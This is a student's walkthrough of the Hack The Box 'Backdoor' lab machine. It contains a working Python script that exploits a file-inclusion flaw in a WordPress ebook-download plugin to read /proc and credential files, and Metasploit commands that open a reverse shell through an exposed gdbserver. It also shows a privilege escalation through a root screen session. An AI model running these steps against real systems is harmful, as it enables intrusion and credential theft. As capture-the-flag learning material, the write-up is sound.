# Backdoor Machine Writeup

This machine was a lot of fun and it showed me that I'm getting more comfortable and learning from some previous experience. Sticking with the theme I have, there were still some setbacks, and of course they were my own doing. I got started with this machine about a month ago, and a week after starting, I was doing the NCL Team Game and while attempting some registry forensics, I totaled the windows installation on my laptop, which had all my HTB screenshots and progress. Long story short, now my laptop has arch linux! 

Moving forward, I was able to finish this machine relatively quickly. It took me about 2 weeks, but I did the bulk of the work in one day and the other time was spent doing assorted schoolwork or going to my paying job. Now, let's get into the process!

## Step 1: Recon

In the usual fashion, I started this encounter doing some recon. I always start my recon off with a trusty intense scan

    nmap -T4 -A -v 10.10.11.125 

![image](https://user-images.githubusercontent.com/70218428/167235951-3760bf9a-cdfd-4de8-a935-375da2ae0947.png)

We can see that we have a few ports open here, namely SSH, HTTP, and a mystery 1337. In retrospect, 1337 should have been a dead giveaway for reasons we will come back to. I decided to take a shot in the dark and see if the root user could connect via SSH, and thankfully I could not. Moving on, I decided to open a browser and go to http://10.10.11.125, and sure enough there was a wordpress default page. Doing a little more digging, I could find that the host name itself was http://backdoor.htb. I added this to /etc/hosts, and went to a wpscan with my API token

    wpscan --url http://backdoor.htb --enumerate u,ap --api-token 877-cash-now
    
 I will not post the entire file here but it is included in this directory. Interestingly enough, according to wpscan there are no plugins on this site and there were no obvious vulnerabilities. That being said, if you went to http://10.10.11.125/wp-content/uploads, you could see the index that way. This gave me an idea to poke around wordpress for a moment and see if it would show me the plugins folder and sure enough, it did. 
 
 ![wp-content_plugins](https://user-images.githubusercontent.com/70218428/167236407-92bf354a-2221-4d12-aab9-e54452a0d782.png)

This shows us an ebook download plugin and a hello.php file. Poking around the ebook download readme file, you can see the version and get some hints that it does not account for local file inclusion or directory traversal. Looking into the usage of the plugin, you can pass a custom URL to the PHP fields and move around the server as you want. Below is the exploitdb entry for this particular entry. 

![exploit_db_entry](https://user-images.githubusercontent.com/70218428/167236530-f72b8ae6-0296-408f-97ea-2e6dada4a46f.png)

Finding this out, I got a little trigger happy and grabbed any file I thought could be useful since I had just learned LFI a few days before. I ended up grabbing passwd, hosts, ssh_config, sshd_config, and wp-config. Passwd revealed an account for user, ssh was a bust, and wp-config gave me admin db credentials (this is a surprise tool that will help us later). _All these files will be in a folder in this directory.

This was the point I got stuck for a while. I tried a number of different things that all failed, and eventually came back to researching port 1337 and LFI. The biggest problem here was figuring out _what process_ was using that port. At this point, some inspiration and lots of frustration hit in the form of learning some Python. 

The idea I had was to use the LFI vulnerability I had stumbled onto and my recently growing knowledge of linux to search through the /proc directory, iterate through all the pids, and return the cmdline file contents with the LFI vulnerability. This took some trial and error with python since I was very new to it, and it took me about 20 minutes to realize it was not working because I spelled my URL wrong. 

    import requests

    for i in range (0,1000):
    
        tgturl = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/" + str(i) + "/cmdline"
        req = requests.get(tgturl)
        length = len(req.content)
        if (length > 90): // 90 was a rough margin of error. If the file did not exist, the length was usually about 84
            print("PID: " + str(i))
            print("   URL: " + tgturl+'\n')
            print("   Response: " + str(req.content) + '\n')
            
This was honestly really cool to get working. Like a lot of other students, I felt somewhat competent with code but also had absolutely no idea how to make it do anything outside of project style code. This introduced me to some more practical use code and _pre built libraries_, which were completely foreign to me at this point in time. 


![gdb_server_response](https://user-images.githubusercontent.com/70218428/167237298-baf97414-71f3-4e58-895d-252d2762d285.png)

_Ignore the random final exam notes in the background. I was absolutely in a class, but when inspiration hits, I listen_

Besides all the nerd stuff above, I now knew what that mystery port 1337 was doing. It was running a nicely vulnerable instance of **gdbserver**, which brings us to step 2.

## Step 2: Exploit the Vulnerable

At this time, I decided it was about time to fire up good ole Metasploit and do some research. Running a search for GDB showed me one exploit, which was my choice. I ran this set of commands:

    use exploit/multi/gdb //I am writing this after the fact, it's the only GDB exploit so you should be able to find it
    set rhosts 10.10.11.125
    set rport 1337
    set lhost tun0 // This just set it to my vpn adapter, making it a little easier
    set lport 3333
   
When I hit run, I immediately ran into a wall because the payload was a x86 meterpreter shell and this box was an x64. Thankfully, it was just as simple as changing the payload to x64 and hitting run

![meterpreter_in](https://user-images.githubusercontent.com/70218428/167237354-d0a031c8-fefc-4978-92e0-bee7c3020590.png)

Now, I won't tell you how long I spent trying to spawn a bash shell from the default meterpreter line. I also won't tell you how long it took me to realize meterpreter has a built in shell command. Let's just say, it was enough time for me to drive about 40 miles, sit and research, and almost miss a different class. Thankfully I did realize eventually that you can just spawn a shell with the command "shell", and with that you capture the user flag!

Now, it was time to figure out how to escalate to root. I tried bringing in some stuff like linPEAS, but HTB had already planned for that. My next step was researching some of the other running processes, and I stumbled across a neat one called Screen, which happened to be running as root. I read through the MAN page, and found out you can attach and detach the screens as long as you were in a valid terminal, and it was just my luck that this one was free floating. 


![plist](https://user-images.githubusercontent.com/70218428/167237609-fb014bd3-c356-4d5f-8a78-fd382029f2c3.png)

![screen_man](https://user-images.githubusercontent.com/70218428/167237588-2adf49c9-af38-4e4d-9694-9dc82d6685a8.png)


Valid Terminal:
![shell_deployed](https://user-images.githubusercontent.com/70218428/167237428-b1e6f91e-a39a-45d9-ad05-b7c555e93c5a.png)

When the /bin/sh shell was spawned, I could run the command screen -x root/root, which attaches the screen that was floating around as root to the current session, effectively escalating privileges and opening the door to the root flag!

![root](https://user-images.githubusercontent.com/70218428/167237655-25fd279b-b2a1-4568-8525-7efc7ee0dfa9.png)

## Step 3: Extra Toys

At this point, the machine was complete, but I had a random impulse at 2 AM the following morning when I realized that I had the admin database credentials. I got up, went back through all the exploitation steps (which by now were muscle memory from the amount of times I had done it wrong), and ended up changing the user and root passwords and connecting via SSH to make life a little easier. I jumped to root and went into mysql, which did not even need creds since I was acting as root. I went in and updated the database entry for the admin account in wordpress, setting the password to password, and I signed into the dashboard. 

![wordpress_db_change](https://user-images.githubusercontent.com/70218428/167237737-f99da66c-3c8c-4f6d-874a-fd9d5fab6985.png)

I gotta say, it was fun but completely useless. No hidden toys for me.. _this time_

![wp_dashboard](https://user-images.githubusercontent.com/70218428/167237747-141105a4-d092-4718-b3af-0866ef4e361e.png)

But with that, I was done!

This machine was honestly a ton of fun. It was challenging but when it all clicked it made a lot of sense. It had some really neat exploitation involved and used LFI in a way I never would have considered otherwise. It introduced me to Python, and got me more familiar with some things and reminded me that I despise wordpress, but I sure do love when wordpress is the target. Maybe that's just old anger from my days of web design.

With that being said, I hope you enjoy! Happy Hunting!
